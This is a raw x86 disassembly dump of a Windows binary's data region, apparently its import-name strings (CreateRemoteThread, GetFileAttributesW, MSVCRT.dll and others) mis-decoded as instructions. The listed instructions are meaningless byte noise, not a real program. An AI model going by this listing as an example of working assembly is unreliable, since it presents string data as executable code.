  428473:	jae    0x4284da
  428475:	jb     0x4284e4
  428477:	popa   
  428478:	je     0x4284e2
  42847a:	gs jb  0x4284ef
  42847d:	add    BYTE PTR [eax],al
  42847f:	mov    BYTE PTR [ebx],al
  428481:	data16 ja 0x4284f6
  428484:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7303f500
  42848c:	je     0x428500
  42848e:	jo     0x4284f2
  428490:	jb     0x4284fd
  428492:	add    ah,cl
  428494:	add    esi,DWORD PTR [ecx+0x73]
  428497:	outs   dx,DWORD PTR ds:[esi]
  428498:	jb     0x42850e
  42849a:	add    BYTE PTR [edx+0x0],dh
  42849d:	pop    edi
  42849e:	pop    edi
  42849f:	addr16 gs je 0x428510
  4284a3:	popa   
  4284a4:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  4284ab:	cli    
  4284ac:	add    esi,DWORD PTR [ebx+0x74]
  4284af:	jb     0x428525
  4284b1:	outs   dx,DWORD PTR ds:[esi]
  4284b2:	imul   eax,DWORD PTR [eax],0x0
  4284b5:	dec    ebp
  4284b6:	push   ebx
  4284b7:	push   esi
  4284b8:	inc    ebx
  4284b9:	push   edx
  4284ba:	push   esp
  4284bb:	cs fs ins BYTE PTR es:[edi],dx
  4284be:	ins    BYTE PTR es:[edi],dx
  4284bf:	add    BYTE PTR [eax],al
  4284c1:	je     0x4284c5
  4284c3:	inc    edi
  4284c4:	gs je  0x42851c
  4284c7:	jae    0x42852e
  4284c9:	jb     0x42850f
  4284cb:	gs popaw 
  4284ce:	jne    0x42853c
  4284d0:	je     0x42851e
  4284d2:	popa   
  4284d3:	outs   dx,BYTE PTR ds:[esi]
  4284d4:	addr16 dec ecx
  4284d6:	inc    esp
  4284d7:	add    BYTE PTR [eax],al
  4284d9:	jnp    0x4284dc
  4284db:	inc    esi
  4284dc:	outs   dx,DWORD PTR ds:[esi]
  4284dd:	ins    BYTE PTR es:[edi],dx
  4284de:	fs push ebx
  4284e0:	je     0x428554
  4284e2:	imul   ebp,DWORD PTR [esi+0x67],0x4280057
  4284e9:	push   ebx
  4284ea:	gs je  0x42853d
  4284ed:	jb     0x428558
  4284ef:	outs   dx,DWORD PTR ds:[esi]
  4284f0:	jb     0x42855b
  4284f2:	je     0x42856d
  4284f4:	inc    ebx
  4284f5:	ins    BYTE PTR es:[edi],dx
  4284f6:	popa   
  4284f7:	jae    0x42856c
  4284f9:	add    BYTE PTR [eax],al
  4284fb:	pop    ebp
  4284fc:	add    DWORD PTR [esi+0x69],eax
  4284ff:	outs   dx,BYTE PTR ds:[esi]
  428500:	fs inc esi
  428502:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  428509:	gs inc ecx
  42850b:	add    BYTE PTR [eax],al
  42850d:	or     al,BYTE PTR [ebx]
  42850f:	dec    esp
  428510:	outs   dx,DWORD PTR ds:[esi]
  428511:	popa   
  428512:	fs push edx
  428514:	gs jae 0x428586
  428517:	jne    0x42858b
  428519:	arpl   WORD PTR [ebp+0x0],sp
  42851c:	add    BYTE PTR ds:0x74655304,bl
  428522:	dec    eax
  428523:	popa   
  428524:	outs   dx,BYTE PTR ds:[esi]
  428525:	fs ins BYTE PTR es:[edi],dx
  428527:	gs inc ebx
  428529:	outs   dx,DWORD PTR ds:[esi]
  42852a:	jne    0x42859a
  42852c:	je     0x42852e
  42852e:	add    BYTE PTR [ecx+0x3],bl
  428531:	push   eax
  428532:	jne    0x4285a0
  428534:	jae    0x42859b
  428536:	inc    ebp
  428537:	jbe    0x42859e
  428539:	outs   dx,BYTE PTR ds:[esi]
  42853a:	je     0x42853c
  42853c:	add    BYTE PTR ds:0x74655304,dl
  428542:	inc    esi
  428543:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  42854b:	outs   dx,DWORD PTR ds:[esi]
  42854c:	dec    edi
  42854d:	inc    ebp
  42854e:	dec    ebp
  42854f:	add    BYTE PTR [eax],al
  428551:	mov    al,BYTE PTR [edx]
  428553:	inc    edi
  428554:	ins    BYTE PTR es:[edi],dx
  428555:	outs   dx,DWORD PTR ds:[esi]
  428556:	bound  esp,QWORD PTR [ecx+0x6c]
  428559:	inc    ebx
  42855a:	outs   dx,DWORD PTR ds:[esi]
  42855b:	ins    DWORD PTR es:[edi],dx
  42855c:	jo     0x4285bf
  42855e:	arpl   WORD PTR [eax+eax*1+0x9],si
  428562:	add    al,BYTE PTR [edi+0x65]
  428565:	je     0x4285b4
  428567:	outs   dx,DWORD PTR ds:[esi]
  428568:	fs jne 0x4285d7
  42856b:	gs inc esi
  42856d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  428575:	add    BYTE PTR [eax],al
  428577:	mov    eax,DWORD PTR [edx]
  428579:	inc    edi
  42857a:	ins    BYTE PTR es:[edi],dx
  42857b:	outs   dx,DWORD PTR ds:[esi]
  42857c:	bound  esp,QWORD PTR [ecx+0x6c]
  42857f:	inc    esp
  428580:	gs ins BYTE PTR es:[edi],dx
  428582:	gs je  0x4285ea
  428585:	inc    ecx
  428586:	je     0x4285f7
  428588:	ins    DWORD PTR es:[edi],dx
  428589:	add    BYTE PTR [eax],al
  42858b:	and    DWORD PTR [ebx+edx*2],eax
  42858e:	gs je  0x4285dd
  428591:	popa   
  428592:	jae    0x428608
  428594:	inc    ebp
  428595:	jb     0x428609
  428597:	outs   dx,DWORD PTR ds:[esi]
  428598:	jb     0x42859a
  42859a:	add    BYTE PTR [ebp+0x4],cl
  42859d:	push   ebx
  42859e:	ins    BYTE PTR es:[edi],dx
  42859f:	gs gs jo 0x4285a3
  4285a3:	inc    eax
  4285a4:	add    al,0x53
  4285a6:	gs je  0x4285fd
  4285a9:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4285b0:	jne    0x428617
  4285b2:	push   esp
  4285b3:	imul   ebp,DWORD PTR [ebp+0x65],0xf3000072
  4285ba:	add    al,0x56
  4285bc:	imul   esi,DWORD PTR [edx+0x74],0x556c6175
  4285c3:	outs   dx,BYTE PTR ds:[esi]
  4285c4:	ins    BYTE PTR es:[edi],dx
  4285c5:	outs   dx,DWORD PTR ds:[esi]
  4285c6:	arpl   WORD PTR [ebx+0x0],bp
  4285c9:	ret    
  4285ca:	add    al,0x6c
  4285cc:	jae    0x428642
  4285ce:	jb     0x428633
  4285d0:	ins    DWORD PTR es:[edi],dx
  4285d1:	jo     0x42862a
  4285d3:	add    BYTE PTR [eax],al
  4285d5:	dec    esp
  4285d6:	add    al,0x53
  4285d8:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  4285df:	jae    0x428650
  4285e1:	jne    0x428655
  4285e3:	arpl   WORD PTR [ebp+0x0],sp
  4285e6:	add    BYTE PTR [edx+0x74654701],cl
  4285ec:	inc    ecx
  4285ed:	inc    ebx
  4285ee:	push   eax
  4285ef:	add    BYTE PTR [eax],al
  4285f1:	jno    0x4285f5
  4285f3:	inc    edi
  4285f4:	gs je  0x42864b
  4285f7:	imul   ebp,DWORD PTR [ebp+0x65],0x656e6f5a
  4285fe:	dec    ecx
  4285ff:	outs   dx,BYTE PTR ds:[esi]
  428600:	outs   dx,WORD PTR ds:[esi]
  428602:	jb     0x428671
  428604:	popa   
  428605:	je     0x428670
  428607:	outs   dx,DWORD PTR ds:[esi]
  428608:	outs   dx,BYTE PTR ds:[esi]
  428609:	add    BYTE PTR [eax],al
  42860b:	jae    0x42860f
  42860d:	inc    edi
  42860e:	gs je  0x428666
  428611:	jae    0x428678
  428613:	jb     0x428659
  428615:	gs popaw 
  428618:	jne    0x428686
  42861a:	je     0x428668
  42861c:	inc    ebx
  42861d:	dec    ecx
  42861e:	inc    esp
  42861f:	add    BYTE PTR [eax],al
  428621:	mov    al,0x3
  428623:	push   edx
  428624:	gs ins BYTE PTR es:[edi],dx
  428626:	gs popa 
  428628:	jae    0x42868f
  42862a:	push   ebx
  42862b:	gs ins DWORD PTR es:[edi],dx
  42862d:	popa   
  42862e:	jo     0x428698
  428630:	outs   dx,DWORD PTR ds:[esi]
  428631:	jb     0x428698
  428633:	add    BYTE PTR [eax],al
  428635:	ins    DWORD PTR es:[edi],dx
  428636:	add    al,BYTE PTR [edi+0x65]
  428639:	je     0x42868f
  42863b:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  428642:	je     0x428644
  428644:	add    dh,al
  428646:	add    al,0x6c
  428648:	jae    0x4286be
  42864a:	jb     0x4286af
  42864c:	ins    DWORD PTR es:[edi],dx
  42864d:	jo     0x4286b8
  42864f:	push   edi
  428650:	add    bl,bl
  428652:	add    cl,BYTE PTR [ecx+0x73]
  428655:	push   esi
  428656:	popa   
  428657:	ins    BYTE PTR es:[edi],dx
  428658:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  428660:	add    dl,al
  428662:	add    al,0x6c
  428664:	jae    0x4286da
  428666:	jb     0x4286cb
  428668:	ins    DWORD PTR es:[edi],dx
  428669:	jo     0x4286ac
  42866b:	add    BYTE PTR [eax],al
  42866d:	in     al,0x3
  42866f:	push   ebx
  428670:	gs je  0x4286b6
  428673:	outs   dx,DWORD PTR ds:[esi]
  428674:	ins    DWORD PTR es:[edi],dx
  428675:	ins    DWORD PTR es:[edi],dx
  428676:	push   esp
  428677:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  42867e:	add    BYTE PTR [edx+0x65724601],al
  428684:	gs dec esp
  428686:	imul   esp,DWORD PTR [edx+0x72],0x797261
  42868d:	pop    DWORD PTR [edx]
  42868f:	inc    edi
  428690:	ins    BYTE PTR es:[edi],dx
  428691:	outs   dx,DWORD PTR ds:[esi]
  428692:	bound  esp,QWORD PTR [ecx+0x6c]
  428695:	inc    esi
  428696:	ins    BYTE PTR es:[edi],dx
  428697:	popa   
  428698:	addr16 jae 0x42869b
  42869b:	into   
  42869c:	add    al,0x6c
  42869e:	jae    0x428714
  4286a0:	jb     0x42870e
  4286a2:	outs   dx,BYTE PTR gs:[esi]
  4286a4:	inc    ecx
  4286a5:	add    BYTE PTR [eax],al
  4286a7:	sbb    BYTE PTR [ebx+edx*2],al
  4286aa:	gs je  0x4286f3
  4286ad:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4286b5:	gs jb  0x4286b8
  4286b8:	add    BYTE PTR [eax+0x2],ah
  4286bb:	inc    edi
  4286bc:	gs je  0x428713
  4286bf:	gs ins DWORD PTR es:[edi],dx
  4286c1:	jo     0x428709
  4286c3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  4286cb:	add    BYTE PTR [eax],al
  4286cd:	sub    eax,0x6e694601
  4286d2:	fs inc ecx
  4286d4:	je     0x428745
  4286d6:	ins    DWORD PTR es:[edi],dx
  4286d7:	push   edi
  4286d8:	add    dl,ch
  4286da:	add    BYTE PTR [ebx+0x72],al
  4286dd:	gs popa 
  4286df:	je     0x428746
  4286e1:	push   ebx
  4286e2:	gs ins DWORD PTR es:[edi],dx
  4286e4:	popa   
  4286e5:	jo     0x42874f
  4286e7:	outs   dx,DWORD PTR ds:[esi]
  4286e8:	jb     0x42874f
  4286ea:	push   edi
  4286eb:	add    BYTE PTR [eax],al
  4286ed:	fadd   QWORD PTR [ebx]
  4286ef:	push   ebx
  4286f0:	gs popa 
  4286f2:	jb     0x428757
  4286f4:	push   0x68746150
  4286f9:	push   edi
  4286fa:	add    BYTE PTR [ebx+eax*1+0x4f],al
  4286fe:	jo     0x428765
  428700:	outs   dx,BYTE PTR ds:[esi]
  428701:	push   ebx
  428702:	gs ins DWORD PTR es:[edi],dx
  428704:	popa   
  428705:	jo     0x42876f
  428707:	outs   dx,DWORD PTR ds:[esi]
  428708:	jb     0x42876f
  42870a:	push   edi
  42870b:	add    BYTE PTR [eax],al
  42870d:	into   
  42870e:	add    cl,BYTE PTR [ecx+0x73]
  428711:	inc    edx
  428712:	popa   
  428713:	fs push edi
  428715:	jb     0x428780
  428717:	je     0x42877e
  428719:	push   eax
  42871a:	je     0x42878e
  42871c:	add    cl,dh
  42871e:	add    DWORD PTR [edi+0x65],eax
  428721:	je     0x428769
  428723:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  42872b:	xchg   edx,eax
  42872c:	add    al,BYTE PTR [edi+0x6c]
  42872f:	outs   dx,DWORD PTR ds:[esi]
  428730:	bound  esp,QWORD PTR [ecx+0x6c]
  428733:	inc    edi
  428734:	gs je  0x428778
  428737:	je     0x4287a8
  428739:	ins    DWORD PTR es:[edi],dx
  42873a:	dec    esi
  42873b:	popa   
  42873c:	ins    DWORD PTR es:[edi],dx
  42873d:	gs push edi
  42873f:	add    BYTE PTR [eax],al
  428741:	mov    edi,0x74736c04
  428746:	jb     0x4287ab
  428748:	popa   
  428749:	je     0x42878c
  42874b:	add    BYTE PTR [eax],al
  42874d:	out    0x0,al
  42874f:	inc    ebx
  428750:	jb     0x4287b7
  428752:	popa   
  428753:	je     0x4287ba
  428755:	push   edx
  428756:	gs ins DWORD PTR es:[edi],dx
  428758:	outs   dx,DWORD PTR ds:[esi]
  428759:	je     0x4287c0
  42875b:	push   esp
  42875c:	push   0x64616572
  428761:	add    BYTE PTR [eax],al
  428763:	imul   eax,DWORD PTR [edx*2+0x6e61686e],0x64
  42876b:	ins    BYTE PTR es:[edi],dx
  42876c:	gs fs inc ebp
  42876f:	js     0x4287d4
  428771:	gs jo  0x4287e8
  428774:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  42877b:	gs jb  0x42877e
  42877e:	add    BYTE PTR [ebx+0x6d655203],dh
  428784:	outs   dx,DWORD PTR ds:[esi]
  428785:	jbe    0x4287ec
  428787:	inc    esp
  428788:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42878f:	jns    0x4287d2
  428791:	add    BYTE PTR [eax],al
  428793:	pop    edi
  428794:	add    al,BYTE PTR [edi+0x65]
  428797:	je     0x4287ed
  428799:	gs ins DWORD PTR es:[edi],dx
  42879b:	jo     0x4287e3
  42879d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4287a5:	add    BYTE PTR [eax],al
  4287a7:	out    0x0,eax
  4287a9:	inc    ebx
  4287aa:	jb     0x428811
  4287ac:	popa   
  4287ad:	je     0x428814
  4287af:	push   ebx
  4287b0:	gs ins DWORD PTR es:[edi],dx
  4287b2:	popa   
  4287b3:	jo     0x42881d
  4287b5:	outs   dx,DWORD PTR ds:[esi]
  4287b6:	jb     0x42881d
  4287b8:	inc    ecx
  4287b9:	add    BYTE PTR [eax],al
  4287bb:	in     al,dx
  4287bc:	add    DWORD PTR [edi+0x65],eax
  4287bf:	je     0x428807
  4287c1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4287c9:	bound  esi,QWORD PTR [ebp+0x74]
  4287cc:	gs jae 0x428826
  4287cf:	add    BYTE PTR [eax],al
  4287d1:	jmp    0x6946:0x74654701
  4287d8:	ins    BYTE PTR es:[edi],dx
  4287d9:	gs inc ecx
  4287db:	je     0x428851
  4287dd:	jb     0x428848
  4287df:	bound  esi,QWORD PTR [ebp+0x74]
  4287e2:	gs jae 0x42882a
  4287e5:	js     0x428828
  4287e7:	add    BYTE PTR [eax],al
  4287e9:	nop
  4287ea:	add    al,BYTE PTR [edi+0x6c]
  4287ed:	outs   dx,DWORD PTR ds:[esi]
  4287ee:	bound  esp,QWORD PTR [ecx+0x6c]
  4287f1:	inc    esi
  4287f2:	jb     0x428859
  4287f4:	add    BYTE PTR gs:[eax],al
  4287f7:	inc    ebp
  4287f8:	add    al,BYTE PTR [edi+0x65]
  4287fb:	je     0x428850
  4287fd:	je     0x428860
  4287ff:	jb     0x428875
  428801:	jne    0x428873
  428803:	dec    ecx
  428804:	outs   dx,BYTE PTR ds:[esi]
  428805:	outs   dx,WORD PTR ds:[esi]
  428807:	push   edi
  428808:	add    BYTE PTR [ecx+0x6f6c4702],dl
  42880e:	bound  esp,QWORD PTR [ecx+0x6c]
  428811:	inc    edi
  428812:	gs je  0x428856
  428815:	je     0x428886
  428817:	ins    DWORD PTR es:[edi],dx
  428818:	dec    esi
  428819:	popa   
  42881a:	ins    DWORD PTR es:[edi],dx
  42881b:	gs inc ecx
  42881d:	add    BYTE PTR [eax],al
  42881f:	mov    ds:0x6c614300,al
  428824:	ins    BYTE PTR es:[edi],dx
  428825:	dec    esi
  428826:	popa   
  428827:	ins    DWORD PTR es:[edi],dx
  428828:	gs fs push eax
  42882b:	imul   esi,DWORD PTR [eax+0x65],0xf3000057
  428832:	add    DWORD PTR [edi+0x65],eax
  428835:	je     0x42887d
  428837:	jne    0x4288a5
  428839:	ins    BYTE PTR es:[edi],dx
  42883a:	push   eax
  42883b:	popa   
  42883c:	je     0x4288a6
  42883e:	dec    esi
  42883f:	popa   
  428840:	ins    DWORD PTR es:[edi],dx
  428841:	gs push edi
  428843:	add    BYTE PTR [eax],al
  428845:	xchg   DWORD PTR [edx],eax
  428847:	inc    edi
  428848:	ins    BYTE PTR es:[edi],dx
  428849:	outs   dx,DWORD PTR ds:[esi]
  42884a:	bound  esp,QWORD PTR [ecx+0x6c]
  42884d:	inc    ecx
  42884e:	fs fs inc ecx
  428851:	je     0x4288c2
  428853:	ins    DWORD PTR es:[edi],dx
  428854:	inc    ecx
  428855:	add    BYTE PTR [eax],al
  428857:	dec    ebx
  428858:	inc    ebp
  428859:	push   edx
  42885a:	dec    esi
  42885b:	inc    ebp
  42885c:	dec    esp
  42885d:	xor    esi,DWORD PTR [edx]
  42885f:	cs fs ins BYTE PTR es:[edi],dx
  428862:	ins    BYTE PTR es:[edi],dx
  428863:	add    BYTE PTR [eax],al
  428865:	sahf   
  428866:	add    DWORD PTR [ecx+0x73],ecx
  428869:	push   edx
  42886a:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  42886f:	jo     0x4288e5
  428871:	jns    0x428873
  428873:	mov    DWORD PTR [ecx],eax
  428875:	dec    ecx
  428876:	outs   dx,BYTE PTR ds:[esi]
  428877:	jbe    0x4288da
  428879:	ins    BYTE PTR es:[edi],dx
  42887a:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  428882:	je     0x428884
  428884:	add    ch,dh
  428886:	add    BYTE PTR [edi+0x65],al
  428889:	je     0x4288ce
  42888b:	ins    BYTE PTR es:[edi],dx
  42888c:	popa   
  42888d:	jae    0x428902
  42888f:	dec    ecx
  428890:	outs   dx,BYTE PTR ds:[esi]
  428891:	outs   dx,WORD PTR ds:[esi]
  428893:	inc    ebp
  428894:	js     0x4288d7
  428896:	add    al,ah
  428898:	add    BYTE PTR [esi+0x69],al
  42889b:	ins    BYTE PTR es:[edi],dx
  42889c:	ins    BYTE PTR es:[edi],dx
  42889d:	push   edx
  42889e:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4288a3:	jl     0x4288a7
  4288a5:	push   ebx
  4288a6:	push   0x774f776f
  4288ab:	outs   dx,BYTE PTR ds:[esi]
  4288ac:	gs fs push eax
  4288af:	outs   dx,DWORD PTR ds:[esi]
  4288b0:	jo     0x428927
  4288b2:	jo     0x428927
  4288b4:	add    ch,al
  4288b6:	add    DWORD PTR [ebp+0x61],ecx
  4288b9:	jo     0x428911
  4288bb:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  4288c2:	gs jns 0x428906
  4288c5:	add    BYTE PTR [eax],al
  4288c7:	test   al,0x1
  4288c9:	dec    esp
  4288ca:	outs   dx,DWORD PTR ds:[esi]
  4288cb:	popa   
  4288cc:	fs inc ecx
  4288ce:	arpl   WORD PTR [ebx+0x65],sp
  4288d1:	ins    BYTE PTR es:[edi],dx
  4288d2:	gs jb  0x428936
  4288d5:	je     0x428946
  4288d7:	jb     0x42894c
  4288d9:	push   edi
  4288da:	add    BYTE PTR [edi+0x616f4c01],ch
  4288e0:	fs dec ecx
  4288e2:	arpl   WORD PTR [edi+0x6e],bp
  4288e5:	inc    ecx
  4288e6:	add    BYTE PTR [eax+0x1],bl
  4288e9:	inc    edi
  4288ea:	gs je  0x428940
  4288ed:	jne    0x428951
  4288ef:	dec    ebp
  4288f0:	outs   dx,BYTE PTR gs:[esi]
  4288f2:	jne    0x4288f4
  4288f4:	add    bl,al
  4288f6:	add    BYTE PTR [ebp+0x6e],al
  4288f9:	fs inc esp
  4288fb:	imul   esp,DWORD PTR [ecx+0x6c],0x3300676f
  428902:	add    BYTE PTR [ebx+0x68],al
  428905:	popa   
  428906:	jb     0x42895c
  428908:	outs   dx,DWORD PTR ds:[esi]
  428909:	dec    edi
  42890a:	gs ins DWORD PTR es:[edi],dx
  42890c:	inc    edx
  42890d:	jne    0x428975
  42890f:	inc    cx
  428911:	add    BYTE PTR [eax],al
  428913:	pop    ecx
  428914:	add    DWORD PTR [edi+0x65],eax
  428917:	je     0x42896c
  428919:	jns    0x42898e
  42891b:	inc    ebx
  42891c:	outs   dx,DWORD PTR ds:[esi]
  42891d:	ins    BYTE PTR es:[edi],dx
  42891e:	outs   dx,DWORD PTR ds:[esi]
  42891f:	jb     0x428921
  428921:	mov    es,WORD PTR [edx]
  428923:	push   esp
  428924:	outs   dx,DWORD PTR ds:[esi]
  428925:	push   ebp
  428926:	outs   dx,BYTE PTR ds:[esi]
  428927:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  42892e:	add    BYTE PTR ds:0x6c6c4100,al
  428934:	outs   dx,DWORD PTR ds:[esi]
  428935:	ja     0x42898a
  428937:	gs je  0x428980
  42893a:	outs   dx,DWORD PTR ds:[esi]
  42893b:	jb     0x4289a2
  42893d:	addr16 jb 0x4289af
  428940:	jne    0x4289b0
  428942:	fs push edi
  428944:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  42894b:	mov    BYTE PTR [ecx],al
  42894d:	dec    ecx
  42894e:	outs   dx,BYTE PTR ds:[esi]
  42894f:	je     0x4289b6
  428951:	jb     0x4289c6
  428953:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  428958:	arpl   WORD PTR [eax+eax*1+0x1],si
  42895c:	add    BYTE PTR [ecx+0x63],al
  42895f:	je     0x4289ca
  428961:	jbe    0x4289c4
  428963:	je     0x4289ca
  428965:	dec    ebx
  428966:	gs jns 0x4289cb
  428969:	outs   dx,DWORD PTR ds:[esi]
  42896a:	popa   
  42896b:	jb     0x4289d1
  42896d:	dec    esp
  42896e:	popa   
  42896f:	jns    0x4289e0
  428971:	jne    0x4289e7
  428973:	add    BYTE PTR [eax],al
  428975:	out    dx,al
  428976:	add    DWORD PTR [eax+0x65],edx
  428979:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  42897e:	jae    0x4289e1
  428980:	addr16 gs inc ecx
  428983:	add    BYTE PTR [eax],al
  428985:	add    eax,DWORD PTR [eax]
  428987:	inc    ecx
  428988:	fs push 0x75
  42898b:	jae    0x428a01
  42898d:	push   edi
  42898e:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428995:	arpl   WORD PTR [ebp+eax*2+0x78],si
  428999:	add    BYTE PTR [eax],al
  42899b:	cmp    al,0x1
  42899d:	inc    edi
  42899e:	gs je  0x4289ee
  4289a1:	gs jae 0x428a17
  4289a4:	popa   
  4289a5:	addr16 gs push eax
  4289a8:	outs   dx,DWORD PTR ds:[esi]
  4289a9:	jae    0x4289ab
  4289ab:	push   ecx
  4289ac:	add    dl,BYTE PTR [ebx+0x65]
  4289af:	je     0x428a01
  4289b1:	popa   
  4289b2:	jb     0x428a19
  4289b4:	outs   dx,BYTE PTR ds:[esi]
  4289b5:	je     0x4289b7
  4289b7:	lahf   
  4289b8:	add    BYTE PTR [ecx+ebp*2+0x73],al
  4289bc:	jo     0x428a1f
  4289be:	je     0x428a23
  4289c0:	push   0x7373654d
  4289c5:	popa   
  4289c6:	addr16 gs inc ecx
  4289c9:	add    BYTE PTR [eax],al
  4289cb:	fwait
  4289cc:	add    dl,BYTE PTR [ebp+0x6e]
  4289cf:	ins    BYTE PTR es:[edi],dx
  4289d0:	outs   dx,DWORD PTR ds:[esi]
  4289d1:	popa   
  4289d2:	fs dec ebx
  4289d4:	gs jns 0x428a39
  4289d7:	outs   dx,DWORD PTR ds:[esi]
  4289d8:	popa   
  4289d9:	jb     0x428a3f
  4289db:	dec    esp
  4289dc:	popa   
  4289dd:	jns    0x428a4e
  4289df:	jne    0x428a55
  4289e1:	add    BYTE PTR [eax],al
  4289e3:	out    0x0,eax
  4289e5:	inc    esi
  4289e6:	jb     0x428a49
  4289e8:	ins    DWORD PTR es:[edi],dx
  4289e9:	gs push edx
  4289eb:	arpl   WORD PTR gs:[eax+eax*1-0x21],si
  4289f0:	add    BYTE PTR [ebp+0x78],al
  4289f3:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4289fb:	jae    0x428a42
  4289fd:	js     0x4289ff
  4289ff:	rol    BYTE PTR [edx],0x77
  428a02:	jae    0x428a74
  428a04:	jb     0x428a6f
  428a06:	outs   dx,BYTE PTR ds:[esi]
  428a07:	je     0x428a6f
  428a09:	push   edi
  428a0a:	add    BYTE PTR [eax],bh
  428a0c:	add    dl,BYTE PTR [ebx+0x65]
  428a0f:	je     0x428a54
  428a11:	jne    0x428a85
  428a13:	jae    0x428a84
  428a15:	jb     0x428a17
  428a17:	sub    eax,DWORD PTR [eax]
  428a19:	inc    ebx
  428a1a:	push   0x654e7261
  428a1f:	js     0x428a95
  428a21:	inc    ebp
  428a22:	js     0x428a65
  428a24:	add    BYTE PTR [eax+0x2],bl
  428a27:	push   ebx
  428a28:	gs je  0x428a7d
  428a2b:	arpl   WORD PTR gs:[eax+eax*1+0x55],si
  428a30:	add    DWORD PTR [edi+0x65],eax
  428a33:	je     0x428a88
  428a35:	arpl   WORD PTR [edx+0x6f],si
  428a38:	ins    BYTE PTR es:[edi],dx
  428a39:	ins    BYTE PTR es:[edi],dx
  428a3a:	push   eax
  428a3b:	outs   dx,DWORD PTR ds:[esi]
  428a3c:	jae    0x428a3e
  428a3e:	add    BYTE PTR [edx+eax*1],bl
  428a41:	push   ebx
  428a42:	arpl   WORD PTR [edx+0x65],si
  428a45:	outs   dx,BYTE PTR gs:[esi]
  428a47:	push   esp
  428a48:	outs   dx,DWORD PTR ds:[esi]
  428a49:	inc    ebx
  428a4a:	ins    BYTE PTR es:[edi],dx
  428a4b:	imul   esp,DWORD PTR [ebp+0x6e],0xb9000074
  428a52:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428a56:	fs dec ebp
  428a58:	outs   dx,BYTE PTR gs:[esi]
  428a5a:	jne    0x428ab3
  428a5c:	add    BYTE PTR [eax+0x1],al
  428a5f:	inc    edi
  428a60:	gs je  0x428ab0
  428a63:	outs   dx,DWORD PTR ds:[esi]
  428a64:	outs   dx,BYTE PTR ds:[esi]
  428a65:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  428a6d:	push   edi
  428a6e:	add    BYTE PTR [eax+0x1],ch
  428a71:	inc    edi
  428a72:	gs je  0x428acc
  428a75:	imul   ebp,DWORD PTR [esi+0x64],0x4100776f
  428a7c:	add    dl,BYTE PTR [ebx+0x65]
  428a7f:	je     0x428ac7
  428a81:	outs   dx,DWORD PTR ds:[esi]
  428a82:	arpl   WORD PTR [ebp+0x73],si
  428a85:	add    BYTE PTR [eax],al
  428a87:	bound  eax,QWORD PTR [ecx]
  428a89:	inc    edi
  428a8a:	gs je  0x428ae1
  428a8d:	outs   dx,DWORD PTR ds:[esi]
  428a8e:	jo     0x428ae7
  428a90:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428a97:	and    DWORD PTR [edx],eax
  428a99:	push   ebx
  428a9a:	outs   dx,BYTE PTR gs:[esi]
  428a9c:	fs inc esp
  428a9e:	ins    BYTE PTR es:[edi],dx
  428a9f:	addr16 dec ecx
  428aa1:	je     0x428b08
  428aa3:	ins    DWORD PTR es:[edi],dx
  428aa4:	dec    ebp
  428aa5:	gs jae 0x428b1b
  428aa8:	popa   
  428aa9:	addr16 gs inc ecx
  428aac:	add    BYTE PTR [eax+eax*1+0x43],al
  428ab0:	ins    BYTE PTR es:[edi],dx
  428ab1:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  428ab8:	jb     0x428aba
  428aba:	add    BYTE PTR [esi+0x1],dl
  428abd:	inc    edi
  428abe:	gs je  0x428b14
  428ac1:	arpl   WORD PTR [edx+0x6f],si
  428ac4:	ins    BYTE PTR es:[edi],dx
  428ac5:	ins    BYTE PTR es:[edi],dx
  428ac6:	push   edx
  428ac7:	popa   
  428ac8:	outs   dx,BYTE PTR ds:[esi]
  428ac9:	add    BYTE PTR gs:[bx+si],al
  428acd:	or     DWORD PTR [ecx],eax
  428acf:	inc    edi
  428ad0:	gs je  0x428b16
  428ad3:	jne    0x428b47
  428ad5:	jae    0x428b46
  428ad7:	jb     0x428b29
  428ad9:	outs   dx,DWORD PTR ds:[esi]
  428ada:	jae    0x428adc
  428adc:	add    BYTE PTR [ecx+0x2],bl
  428adf:	push   ebx
  428ae0:	gs je  0x428b35
  428ae3:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  428ae8:	jo     0x428b5e
  428aea:	jns    0x428aec
  428aec:	add    BYTE PTR [eax+0x2],ch
  428aef:	push   ebx
  428af0:	gs je  0x428b48
  428af3:	jae    0x428b5a
  428af5:	jb     0x428b46
  428af7:	bound  ebp,QWORD PTR [edx+0x65]
  428afa:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428afe:	outs   dx,WORD PTR ds:[esi]
  428b00:	jb     0x428b6f
  428b02:	popa   
  428b03:	je     0x428b6e
  428b05:	outs   dx,DWORD PTR ds:[esi]
  428b06:	outs   dx,BYTE PTR ds:[esi]
  428b07:	push   edi
  428b08:	add    BYTE PTR [ebx],ch
